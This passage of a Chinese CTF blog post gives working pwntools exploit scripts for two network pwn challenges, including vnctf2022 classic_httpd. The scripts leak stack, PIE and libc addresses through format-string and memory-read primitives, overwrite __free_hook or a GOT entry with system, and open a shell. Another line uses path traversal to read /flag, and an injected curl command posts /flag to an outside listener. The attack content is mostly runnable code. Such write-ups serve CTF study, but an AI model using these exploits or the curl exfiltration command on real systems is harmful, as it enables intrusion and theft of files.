</span></span><span style=display:flex><span>        data <span style=color:#666>=</span> data<span style=color:#666>.</span>ljust(pad_to, <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    data <span style=color:#666>+=</span> extra
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>send(data)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;The decode  rc4_msg is&#39;</span>)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvline()
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39; </span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#39;</span>, drop<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># context.log_level = &#39;debug&#39;</span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#b44>&#39;./libc-2.31.so&#39;</span>, checksec<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>False</span>)
</span></span><span style=display:flex><span>malloc_got <span style=color:#666>=</span> <span style=color:#666>0x6f50</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># 47.108.206.43:20468</span>
</span></span><span style=display:flex><span>server_p <span style=color:#666>=</span> remote(<span style=color:#b44>&#39;47.108.206.43&#39;</span>, <span style=color:#666>20468</span>)
</span></span><span style=display:flex><span>server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;Server is listening on port 10000........</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1, fd1 <span style=color:#666>=</span> new_client()
</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#b44>&#39;fd:&#39;</span>, fd1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>register(p1, <span style=color:#b44>b</span><span style=color:#b44>&#39;d&#39;</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;a&#39;</span>, pbkey)
</span></span><span style=display:flex><span>rc4key <span style=color:#666>=</span> login(p1, <span style=color:#b44>b</span><span style=color:#b44>&#39;d&#39;</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;a&#39;</span>, pbkey)
</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#b44>&#39;rc4key:&#39;</span>, rc4key<span style=color:#666>.</span>hex())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>stack_addr <span style=color:#666>=</span> <span style=color:#a2f>int</span>(session(p1, rc4key, <span style=color:#b44>b</span><span style=color:#b44>&#39;%p&#39;</span>), <span style=color:#666>16</span>)
</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#b44>&#39;stack:&#39;</span>, <span style=color:#a2f>hex</span>(stack_addr))
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># 0 -&gt; 6</span>
</span></span><span style=display:flex><span>elf_base <span style=color:#666>=</span> u64(session(p1, rc4key, <span style=color:#b44>b</span><span style=color:#b44>&#39;%15$s&#39;</span>, <span style=color:#666>9</span> <span style=color:#666>*</span> <span style=color:#666>8</span>, p64(stack_addr <span style=color:#666>+</span> <span style=color:#666>0x400</span> <span style=color:#666>+</span> <span style=color:#666>0x800</span> <span style=color:#666>+</span> <span style=color:#666>0x30</span> <span style=color:#666>+</span> <span style=color:#666>8</span>)) <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00\x00</span><span style=color:#b44>&#39;</span>) <span style=color:#666>-</span> <span style=color:#666>0x3208</span>
</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#b44>&#39;elf:&#39;</span>, <span style=color:#a2f>hex</span>(elf_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(session(p1, rc4key, <span style=color:#b44>b</span><span style=color:#b44>&#39;%15$s&#39;</span>, <span style=color:#666>9</span> <span style=color:#666>*</span> <span style=color:#666>8</span>, p64(elf_base <span style=color:#666>+</span> malloc_got)) <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00\x00</span><span style=color:#b44>&#39;</span>) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#39;malloc&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#b44>&#39;libc:&#39;</span>, <span style=color:#a2f>hex</span>(libc_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>6</span>):
</span></span><span style=display:flex><span>    <span style=color:#a2f>print</span>(session(p1, rc4key, <span style=color:#b44>b</span><span style=color:#b44>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#a2f>str</span>(((libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#39;system&#39;</span>]) <span style=color:#666>&gt;&gt;</span> (<span style=color:#666>8</span> <span style=color:#666>*</span> i)) <span style=color:#666>&amp;</span> <span style=color:#666>0xff</span>)<span style=color:#666>.</span>encode() <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;c%15$hhn&#39;</span>, <span style=color:#666>9</span> <span style=color:#666>*</span> <span style=color:#666>8</span>, p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#39;__free_hook&#39;</span>] <span style=color:#666>+</span> i)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>session(p1, rc4key, <span style=color:#b44>b</span><span style=color:#b44>&#39;/bin/sh&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server_p<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h1 id=vnctf2022-classic_httpd>vnctf2022 classic_httpd
<a class=header-anchor href=#vnctf2022-classic_httpd></a></h1><p><strong>这种题当前目录一般都是htdocs，然后flag都会在/根目录下</strong></p><ul><li>这个题和安洵的题有所不同，这里记录一些一下做题过程</li></ul><h2 id=非预期>非预期
<a class=header-anchor href=#%e9%9d%9e%e9%a2%84%e6%9c%9f></a></h2><ul><li>代码审计结束就发现竟然没有检测目录穿越的代码部分，题目也没给libc,估计出题人预期其实也是这个，但是有个地方一直交互不了 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/54.png alt> 没注意到这里要输入\n才能停止循环，一直少了一个\n。payload=b&rsquo;POST /../flag\n\n&rsquo;就可以get flag</li><li>还有一个需要记录的地方是这个题和安洵的题有所不同，安洵的给了两个远程连接，这个题就启动了一个docker给了一个远程连接，不知道是不是因为docker的原因导致无法通过host:4000来连接，在本地试了是可以的,就算在虚拟机里都可以，估计还是docker启动容器的原因 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/55.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/56.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/57.png alt></li></ul><h2 id=预期解>预期解
<a class=header-anchor href=#%e9%a2%84%e6%9c%9f%e8%a7%a3></a></h2><ul><li>当发现文件不存在会进入这个分支 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/58.png alt></li><li>一般用了要文件是htdocs/submit.cgi的形式才会进入下一个分支，这里有点像vmpwn，给出对应的选项，会执行相应的分支，逆出来的结构体如下</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>struct {
</span></span><span style=display:flex><span> uint32_t 
</span></span><span style=display:flex><span> uint32_t type;
</span></span><span style=display:flex><span> uint64_t addr1;
</span></span><span style=display:flex><span> uint64_t addr2;
</span></span><span style=display:flex><span> uint64_t addr3；
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>type=0xf1,  *(addr1+addr2)=*addr3  chance&lt;=2
</span></span><span style=display:flex><span>type=0x88, 打印 *(addr1+addr2) chance&lt;=1
</span></span><span style=display:flex><span>type=0x66  *addr1&lt;=4，可以泄露pie chance=0
</span></span><span style=display:flex><span>type=0x12 没用
</span></span><span style=display:flex><span>type=0x22,addr1=&#39;ping&#39;,strlen(addr2)&lt;=0xf ,以%s打印addr2处
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>第一步泄露pie,第二部泄露libcbase,第三步打strcasecmp的got为system
</span></span></code></pre></div><ul><li>留意到有个加密，一开始自己手逆加密过程，其实这就是个base64加解密，客户端发送base64加密后的密文，服务端接受后解密，估计这个就是个解密过程，pwn中的密码算法一般也不会太麻烦，因此也不涉及换表什么的</li><li>exp,注意要多次remote连接,原因如图。accept会阻塞直接下一个连接 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/59.png alt></li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwncli</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>ip <span style=color:#666>=</span> <span style=color:#b44>&#39;node5.buuoj.cn&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#666>=</span> <span style=color:#666>26097</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>get_msg</span>(data: <span style=color:#a2f>bytes</span>):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> <span style=color:#b44>f</span><span style=color:#b44>&#34;GET /submit.cgi?</span><span style=color:#b68;font-weight:700>{</span>base64<span style=color:#666>.</span>b64encode(data)<span style=color:#666>.</span>decode()<span style=color:#b68;font-weight:700>}</span><span style=color:#b44> </span><span style=color:#b62;font-weight:700>\n\n</span><span style=color:#b44>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># get addr</span>
</span></span><span style=display:flex><span>io<span style=color:#666>=</span>remote(ip, port)
</span></span><span style=display:flex><span>data <span style=color:#666>=</span> p32(<span style=color:#666>1</span>) <span style=color:#666>+</span> p32(<span style=color:#666>0x66</span>) <span style=color:#666>+</span> p64(<span style=color:#666>4</span>) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>send(get_msg(data))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>recvuntil(<span style=color:#b44>&#34;Let us look. Oh! That is &#34;</span>)
</span></span><span style=display:flex><span>m <span style=color:#666>=</span> io<span style=color:#666>.</span>recvline()
</span></span><span style=display:flex><span>codebase <span style=color:#666>=</span> int16_ex(m[:<span style=color:#666>14</span>]) <span style=color:#666>-</span> <span style=color:#666>0x4070</span>
</span></span><span style=display:flex><span>log_code_base_addr(codebase)
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#666>=</span>remote(ip, port)
</span></span><span style=display:flex><span>data <span style=color:#666>=</span> p32(<span style=color:#666>1</span>) <span style=color:#666>+</span> p32(<span style=color:#666>0x88</span>) <span style=color:#666>+</span> p64(codebase) <span style=color:#666>+</span> p64(<span style=color:#666>0x60c0</span>) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>send(get_msg(data))
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>recvuntil(<span style=color:#b44>&#34;OK! I give you some message!</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#34;</span>)
</span></span><span style=display:flex><span>m <span style=color:#666>=</span> io<span style=color:#666>.</span>recvline()
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> int16_ex(m[<span style=color:#666>-</span><span style=color:#666>15</span>:<span style=color:#666>-</span><span style=color:#666>1</span>]) <span style=color:#666>-</span> <span style=color:#666>0x1232c0</span>
</span></span><span style=display:flex><span>log_libc_base_addr(libc_base)
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#666>=</span>remote(ip, port)
</span></span><span style=display:flex><span>systemaddr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#666>0x055410</span>
</span></span><span style=display:flex><span>data <span style=color:#666>=</span> p32(<span style=color:#666>2</span>) <span style=color:#666>+</span> p32(<span style=color:#666>0xf1</span>) <span style=color:#666>+</span> p64(codebase) <span style=color:#666>+</span> p64(<span style=color:#666>0x6048</span>) <span style=color:#666>+</span> p64(systemaddr)
</span></span><span style=display:flex><span>data <span style=color:#666>+=</span> p32(<span style=color:#666>0x22</span>) <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#34;ping&#34;</span><span style=color:#666>.</span>ljust(<span style=color:#666>8</span>, <span style=color:#b44>b</span><span style=color:#b44>&#34;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span>) <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;curl -X POST -F </span><span style=color:#b62;font-weight:700>\&#34;</span><span style=color:#b44>flag=@/flag</span><span style=color:#b62;font-weight:700>\&#34;</span><span style=color:#b44> 172.18.211.41:4444&#39;</span> <span style=color:#080;font-style:italic># 这里需要替换为自己的ip和端口</span>
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>send(get_msg(data))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#666>.</span>close()
</span></span></code></pre></div></div><footer class=post-footer><div class=post-tags><a href=/tags/web-pwn>web pwn</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
socket</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://zp9080.github.io/post/web-pwn/socket/ title=socket>https://zp9080.github.io/post/web-pwn/socket/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/pwn%E7%AC%94%E8%AE%B0/skills/ rel=next title=skills><i class="fa fa-chevron-left"></i> skills</a></div><div class="post-nav-prev post-nav-item"><a href=/post/stackoverflow/srop/ rel=prev title=srop>srop
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2024 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
<img src=/imgs/gongan.png alt=鄂公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>